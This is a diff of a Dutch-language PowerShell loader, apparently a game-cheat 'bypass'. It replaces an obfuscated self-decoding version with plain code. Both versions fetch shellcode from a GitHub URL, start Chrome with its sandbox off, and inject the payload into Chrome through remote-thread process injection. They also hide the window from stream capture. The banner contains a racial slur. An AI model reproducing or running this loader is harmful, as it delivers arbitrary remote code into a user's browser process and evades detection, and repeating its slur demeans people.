@@ -1,173 +1,200 @@
-. ( $enV:comSpeC[4,26,25]-jOiN'') ( ('
+$githubRawUrl = "https://raw.githubusercontent.com/MJ06-BP/bp/refs/heads/main/SID.json"
+
+try {
+    
+    $response = Invoke-WebRequest -Uri $githubRawUrl -UseBasicParsing -ErrorAction Stop
+    $jsonContent = $response.Content | ConvertFrom-Json
+    
+    if ($jsonContent -is [array]) {
+        $allowedSids = $jsonContent
+    } elseif ($jsonContent.allowed_sids) {
+        $allowedSids = $jsonContent.allowed_sids
+    } else {
+        $allowedSids = @($jsonContent)
+    }
+
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $currentSid = $currentUser.User.Value
+
+    if ($allowedSids -contains $currentSid) {
+    } else {
+        exit
+    }
+}
+catch {
+    pause
+    exit
+}
 
 Clear-Host
-Write-Host DldDld
-Write-Host Dld  ----------------------------------------'+'Dld -ForegroundColor Cyan
-Write-Host Dld  '+'I '+'             '+'                        IDld -'+'Foregro'+'undColor Cyan
-Write-Host Dld  I      '+' NIGGER BYPASS  v6.7        '+'    '+'IDld -ForegroundColor Cyan
-Wr'+'ite-Host Dld  I       Gemaakt door: MJBP<3           IDld -Foregro'+'undColor Cyan'+'
-Write-Ho'+'st Dld  I                   '+'                   IDld -Foregrou'+'ndColor Cyan
-Write-Host D'+'ld  -------------'+'---------------------------Dld -ForegroundColor Cyan
-Write-Host DldDld
-Write-Host DldDld
-Write-Host DldDld
+Write-Host ""
+Write-Host " ----------------------------------------" -ForegroundColor Cyan
+Write-Host "" -ForegroundColor Cyan
+Write-Host "           NIGGER BYPASS v6.7" -ForegroundColor Cyan
+Write-Host "" -ForegroundColor Cyan
+Write-Host " ----------------------------------------" -ForegroundColor Cyan
+Write-Host ""
+Write-Host ""
+Write-Host ""
+Write-Host "[1] Streamproof versie." -ForegroundColor Yellow
+Write-Host "[2] Zonder Streamproof versie." -ForegroundColor Yellow
+$choice1 = Read-Host "Maak je keuze (1 of 2)."
 
-Write-Host Dld[1] Streamp'+'roof versie.Dld -ForegroundCol'+'or Yellow
-Write-Host Dld[2] Zonder Streamproof versie.Dld -ForegroundColor Yellow
-r9gchoic'+'e1 = Read-Host DldMaak je keuze (1 of 2).Dld
-
-if (r9gchoice1 -eq Dld1Dld) {
-   '+' r9gurl = Dldhttps://raw.gi'+'thubusercontent.com/MJ06-B'+'P/bp/main/b'+'rowser.binD'+'ld
-  '+'  r9guseNvidiaBypass = r9gfalse
-    Write-Hos'+'t Dld[+] Streamproof versie gekozen.Dld -ForegroundColor Green
+if ($choice1 -eq "1") {
+    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
+    $useNvidiaBypass = $false
+    Write-Host "[+] Streamproof versie gekozen." -ForegroundColor Green
 }
-elseif (r'+'9g'+'choice1 -eq Dld2Dld) {
-    r9gurl = Dldht'+'tps://raw.githubuserconten'+'t.com/MJ0'+'6-BP/bp/main/shellc'+'ode.binDld
-    Write-Host Dld[1] Ja, Nvidia clip gebruiken.Dld -ForegroundColor Yellow
-    Write-Host Dld[2] Nee, geen Nvidia cl'+'ip.Dld'+' -Fore'+'groundColor Yellow
- '+'   r9gnvidiaChoice = Read'+'-Host DldWil je Nvidia Byp'+'ass? (1 of 2)Dld
-    r9guseNvidiaBypass = (r9gnvidiaChoice -eq Dld1Dld)
-    if (r9guseNvidia'+'Bypass) {
-        Write-Host Dld[+] Nvidia'+' Byp'+'ass ingeschakeld.Dld -ForegroundColor Green
+elseif ($choice1 -eq "2") {
+    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"
+    Write-Host "[1] Ja, Nvidia clip gebruiken." -ForegroundColor Yellow
+    Write-Host "[2] Nee, geen Nvidia clip." -ForegroundColor Yellow
+    $nvidiaChoice = Read-Host "Wil je Nvidia Bypass? (1 of 2)"
+    $useNvidiaBypass = ($nvidiaChoice -eq "1")
+    if ($useNvidiaBypass) {
+        Write-Host "[+] Nvidia Bypass ingeschakeld." -ForegroundColor Green
     } else {
-   '+'    '+' Writ'+'e-Hos'+'t Dld[+] Nvidia'+' Bypas'+'s uitgeschakeld.Dld -ForegroundColor Yellow
+        Write-Host "[+] Nvidia Bypass uitgeschakeld." -ForegroundColor Yellow
     }
 }
 else {
-    Write-Host Dld[-] O'+'ngeldige '+'keuze!Dld -Foregrou'+'nd'+'Color '+'Red
+    Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red
     pause; exit
-'+'}
-
-r9gMonitorX = 0
-r9gWidth = 1920
-r9gH'+'eight = 1080
-if (r9guseNvidiaBypass) {
-    Write-Host DldD'+'ld
-    Write-Host '+'Dl'+'d[1] Tweede mon'+'itor staat LINKS.Dld -Fo'+'regroundColor Yellow
-    Writ'+'e-Host Dl'+'d[2] T'+'weed'+'e monitor staat RE'+'CHTS.D'+'ld -Foregrou'+'n'+'dColor Yellow
-    r9gmonChoice = Read-Host DldMaak je keuze (1 of 2).Dld
- '+'   if (r9gmonChoice -eq Dld1Dld) { r9gMonitorX = -'+'1920 }
-    elseif (r9gmonChoice -eq Dld2Dld) '+'{ r9gMonitorX = 1920 }
-    else { Write-Hos'+'t Dld[-] Ongeldige keuze!Dld -ForegroundColor Red; pause; exit '+'}
 }
 
-if '+'(-not [Environment]::Is64BitProcess) {
-    Write-Host Dld[-] Gebruik'+' 64-bit PowerShell als Administrator!Dld -Fo'+'regroundColor Red
-    pause;'+' exit
+$MonitorX = 0
+$Width = 1920
+$Height = 1080
+
+if ($useNvidiaBypass) {
+    Write-Host ""
+    Write-Host "[1] Tweede monitor staat LINKS." -ForegroundColor Yellow
+    Write-Host "[2] Tweede monitor staat RECHTS." -ForegroundColor Yellow
+    $monChoice = Read-Host "Maak je keuze (1 of 2)."
+    if ($monChoice -eq "1") { $MonitorX = -1920 }
+    elseif ($monChoice -eq "2") { $MonitorX = 1920 }
+    else { Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red; pause; exit }
 }
 
-funct'+'ion Invoke-Nvid'+'iaBypass {
-    param([int]r9gTargetPID, [int]r9gMonitorX = -1920, [int]r9gWidth = 1920, [int]r9gHeight = 1080)
-    Add-Ty'+'pe @Dld
-using S'+'ystem'+';
+if (-not [Environment]::Is64BitProcess) {
+    Write-Host "[-] Gebruik 64-bit PowerShell als Administrator!" -ForegroundColor Red
+    pause; exit
+}
+
+function Invoke-NvidiaBypass {
+    param([int]$TargetPID, [int]$MonitorX = -1920, [int]$Width = 1920, [int]$Height = 1080)
+    Add-Type @"
+using System;
 using System.Runtime.InteropServices;
-public c'+'lass Wi'+'n32 {
-    [DllImport(Dl'+'duser32.dllD'+'ld)] public static exte'+'rn bool MoveWin'+'dow(IntPtr hWnd, int X, int Y, in'+'t nWidth, int nHeight, bool bRepaint);
-   '+' [DllImport(Dlduser32.dllDld)] public static extern bool SetForegroundWindow(IntPtr hWnd);
-    [DllImport(Dlduser32'+'.dllDld)] public static exte'+'rn ui'+'nt '+'GetWindowThreadProcessId(Int'+'Ptr hWnd, out uint lpdwProcessId);
+public class Win32 {
+    [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
+    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 }
-Dld@ -ErrorAction SilentlyContinue
+"@ -ErrorAction SilentlyContinue
 
-    r9gprocess = Get-Process -Id r9gTar'+'getPID -ErrorAction SilentlyContinue
-    if (-not r9gprocess) { Write-Host Dld[-] '+'Proces niet gevond'+'enDld -Foreground'+'Color Red; '+'return }
-
-    r9ghwnd = r9g'+'process.MainWindo'+'wHandle
-'+'
-    #'+' Fallback als MainWindowHandle leeg is
-   '+' if '+'(r9ghwnd -eq [IntPtr]::Zero) {
-        r9ghwnd = [IntPtr]::Zero
-        r'+'9gcallback = {
-            param(r9ghWnd, '+'r9glParam)
-            r9'+'gprocId = 0
-  '+'          [Win32]::GetWindowThre'+'adProcessId(r9ghW'+'nd, '+'[ref]r9gprocId) Xni Out-Null
-            if (r9gprocId -e'+'q r9gTargetPID) { r9gs'+'c'+'ript:hwnd = r9ghWnd; return r9gfalse }
-   '+'         return r9gtrue
-     '+'   }
-        r9gdelegate = New-Object System.Func[IntPtr, Int'+'Ptr, bool] r9gcallback
-       '+' [Win32]::EnumWindows(r9gdelegate, [IntPtr]::Zero) Xni Out-Null
+    $process = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
+    if (-not $process) { Write-Host "[-] Proces niet gevonden" -ForegroundColor Red; return }
+    
+    $hwnd = $process.MainWindowHandle
+    if ($hwnd -eq [IntPtr]::Zero) {
+        $hwnd = [IntPtr]::Zero
+        $callback = {
+            param($hWnd, $lParam)
+            $procId = 0
+            [Win32]::GetWindowThreadProcessId($hWnd, [ref]$procId) | Out-Null
+            if ($procId -eq $TargetPID) { $script:hwnd = $hWnd; return $false }
+            return $true
+        }
+        $delegate = New-Object System.Func[IntPtr, IntPtr, bool] $callback
+        [Win32]::EnumWindows($delegate, [IntPtr]::Zero) | Out-Null
     }
 
-    if (r9ghwnd -eq [IntPt'+'r]:'+':Ze'+'ro) {
-      '+'  Writ'+'e-Host Dld[-] Geen '+'venster gevondenDld -ForegroundColor Red
+    if ($hwnd -eq [IntPtr]::Zero) {
+        Write-Host "[-] Geen venster gevonden" -ForegroundColor Red
         return
     }
 
-    [Win32]::SetForegroundWindow(r9ghwnd) Xni Out-Null
-    for ('+'r9gi = '+'1;'+' r9gi -le '+'6; r9gi++) {
-        [Win32]::MoveWindow(r9ghw'+'nd, r9gMonitorX, 0, r9gWidth, r9gHeight, r'+'9gtrue) Xni Out-Null
+    [Win32]::SetForegroundWindow($hwnd) | Out-Null
+    for ($i = 1; $i -le 6; $i++) {
+        [Win32]::MoveWindow($hwnd, $MonitorX, 0, $Width, $Height, $true) | Out-Null
         Start-Sleep -Milliseconds 150
     }
 }
-'+'
 
+# Rest van het script...
 try {
-    Start-Process Dldchrome.exeDld -A'+'rgumentList Dld--no-sandbox -'+'-start-maxi'+'mizedDld
+    Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized --disable-gpu"
     Start-Sleep 2
 } catch {
-    Write-Host Dld[-] '+'Kon Chrome niet s'+'tarten. Zorg dat Chrome ge?nstalle'+'erd is.Dld -ForegroundColor Red
+    Write-Host "[-] Kon Chrome niet starten. Zorg dat Chrome geïnstalleerd is." -ForegroundColor Red
     pause; exit
 }
 
-r9gtargetProcess = Get-Process -Name DldchromeDld Xni Where-Object { r9g_.MainWindowTitle -ne DldDld } Xni Select-Object -First 1
-if (-not r9gtargetProcess) {
-    Write-Host Dld[-] Geen venste'+'r met titel gevonden ? laagste memory procesDld -ForegroundColor Yellow
-    r9gtargetProcess = Get-Process -Name Dldc'+'hromeDld Xni Sor'+'t-Ob'+'ject WorkingSet64 Xni Select-Object -First 1
-'+'}
+Write-Host "[i] Zoek Chrome browser proces..." -ForegroundColor Yellow
+$targetProcess = Get-WmiObject Win32_Process | Where-Object {
+    $_.Name -eq "chrome.exe" -and $_.CommandLine -notlike "*--type=*" -and $_.CommandLine -notlike "*--service=*"
+} | Sort-Object CreationDate | Select-Object -First 1
 
-r9gtargetPID = r9gtargetProcess.Id
-W'+'rite-Host Dld[+] Chrom'+'e PID: r9gtargetPIDDld -ForegroundColor Green
+if (-not $targetProcess) {
+    Write-Host "[-] Geen browser proces gevonden!" -ForegroundColor Red
+    pause; exit
+}
 
-if ('+'r9guseNvidiaBypass) {
-    Start-Sle'+'ep -Millisecon'+'d'+'s 2000'+'
-  '+'  Invoke-Nv'+'idiaBypass -TargetPID r9gtarget'+'PID -Moni'+'torX r9gMonitorX
+$targetPID = $targetProcess.ProcessId
+Write-Host "[+] Chrome Browser PID: $targetPID" -ForegroundColor Green
+
+if ($useNvidiaBypass) {
+    Start-Sleep -Milliseconds 2000
+    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
 }
 
 try {
-    r9gshellcode = (New-Object Net.WebClient).DownloadData(r9gurl)
+    $shellcode = (New-Object Net.WebClient).DownloadData($url)
 } catch {
-    Write-Host Dld[-] Download mislukt: r9g(r9'+'g_.Exceptio'+'n.Me'+'ssage)Dld -ForegroundColor Red
+    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
     pause; exit
 }
 
-r9gsize = r'+'9gshellcode.Length
+$size = $shellcode.Length
 
-Add-Type -MemberDefinition @Dld
-    [D'+'llImport(Dldkernel32.dllDl'+'d)]'+' public static extern IntPtr OpenProcess(uint dwDesire'+'dAc'+'cess,'+' bool bInheritHandle, uint '+'dwProcessId);
-    [DllImport('+'Dldkernel32.dllDld)] public static extern IntPtr Vir'+'t'+'ualAllocEx(IntPtr hProces'+'s,'+' IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flP'+'rotect);
-    [DllImport(Dldkernel32.dllDld)] public static extern bool'+' WriteProcessM'+'emory(IntPtr hProcess, IntPtr lpBas'+'eAddress, byte[] lpBuffe'+'r, uint nSize, out UIntPtr lpNumbe'+'rOfByt'+'esWrit'+'ten);
-    [DllImport(Dldkern'+'el32.dllDld)] public static extern bool VirtualProtectEx'+'(IntPtr hProcess, IntPtr lpAddress, uint dwS'+'ize, '+'uint flNewProtec'+'t, out uint lpfl'+'OldProtect);
-    [DllImport(Dldkernel32'+'.dllDld)] public static extern IntPtr Creat'+'eRemoteThread(IntPtr hProcess, Int'+'Ptr lpThreadAttributes, u'+'int dwStackS'+'ize'+', IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-    [DllImport(Dldke'+'rnel32.dllDld)] public static extern bool CloseHandle(IntP'+'tr hObject);
-Dld'+'@ -Name Win32 -Namespace Native -PassThru
+Add-Type -MemberDefinition @"
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+"@ -Name Win32 -Namespace Native -PassThru
 
 try {
-    r9ghProcess = [Nati'+'ve.Win32]::OpenProces'+'s(0x001F0FFF, r9gfalse, r9'+'gtargetPID'+')
-    if (r9ghProcess -eq [IntP'+'tr]::Zero) { 
-        throw DldOpenProcess mislukt. Script moet als Admi'+'nistrator draaien!Dld 
+    $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
+    if ($hProcess -eq [IntPtr]::Zero) {
+        throw "OpenProcess mislukt. Script moet als Administrator draaien!"
     }
 
-    r9gaddr = [Native.Win32]:'+':VirtualAllocEx(r9ghProces'+'s, [IntPtr]::'+'Zero, [uint32]r9gsize, 0x3000, 0x40)
-    r9gbyt'+'esWr'+'itten = [UIntPtr]::Zero
-    [Nat'+'ive.Win3'+'2]::WriteProcessMemory(r9ghProcess, r9gaddr, r9gshellcode, [uint32]r9gsize, [ref]r9gbyt'+'esWritten) Xni Out-N'+'ull
- '+'   [Native.Win32]::VirtualProtectEx(r9ghProcess, r9gaddr, [uin'+'t32]r9gsize, 0x20, ['+'ref]r9gnull) Xni Out-Null
-    [Native.Win32]::CreateRemoteThread(r9ghProcess, [IntPtr]::Zero, 0, r9gaddr, [IntPtr]::Zero, 0, [ref]'+'r9gnull) X'+'ni Out-Null
+    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
+    $bytesWritten = [UIntPtr]::Zero
+    [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten) | Out-Null
+    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x40, [ref]$null) | Out-Null
+    [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null) | Out-Null
 
-    Write-Host Dld[+] Injectie succesvol!Dld -'+'ForegroundColor Green
+    Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
 }
 catch {
-    Write-Host Dld[-] Injectie mislukt: r9g(r9g_.E'+'xception.Message)Dld -Foregroun'+'dColor Red
-  '+'  pause; exit
+    Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
+    pause; exit
 }
 finally {
-    if (r9ghP'+'rocess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle(r9gh'+'Proces'+'s) Xni Out-Null }
+    if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
 }
 
-if (r9guseNvidiaBypass) {
-    Start-Sleep -Mil'+'liseconds 2500
-    Invoke-NvidiaBypass -TargetPID r9gtargetPID -MonitorX r9gMonitorX
+if ($useNvidiaBypass) {
+    Start-Sleep -Milliseconds 2500
+    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
 }
+
 Clear-Host
-Write-Host Dld[!] Laat Chrome '+'open staan! - deze CMD wegklikkenDld -ForegroundColor Red
-Wr'+'ite-Host Dl'+'d[-] Om te cleanen: Klik google chrome weg, NIET op END klikken ingame.Dld -'+'Foregrou'+'ndColor '+'Yellow
-Write-'+'Host Dld#CLEANDld -Fo'+'regroundColor Cyan
-').REPlAce(([CHAr]68+[CHAr]108+[CHAr]100),[sTRING][CHAr]34).REPlAce(([CHAr]114+[CHAr]57+[CHAr]103),'$').REPlAce(([CHAr]88+[CHAr]110+[CHAr]105),[sTRING][CHAr]124) )
+Write-Host "[!] Laat Chrome open staan!" -ForegroundColor Red
+Write-Host "[-] Om te cleanen: druk op END of sluit Chrome helemaal af." -ForegroundColor Yellow
+Write-Host "#CLEAN" -ForegroundColor Cyan
